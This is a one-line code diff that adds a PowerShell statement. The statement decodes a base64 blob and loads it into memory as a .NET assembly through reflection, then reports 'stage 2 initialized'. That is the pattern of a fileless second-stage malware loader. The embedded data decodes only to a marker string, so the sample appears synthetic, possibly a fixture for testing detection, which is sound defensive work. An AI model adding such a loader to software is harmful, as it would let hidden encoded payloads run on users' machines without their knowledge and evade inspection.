@@ -1,0 +1,1 @@
+try { $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp6M2p4OTY2MTBq'); Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length); [Reflection.Assembly]::Load($AssemblyBytes); Write-Verbose "stage marker 40 reached"; Write-Output "stage 2 initialized" } catch { Write-Warning "Loader step failed" }
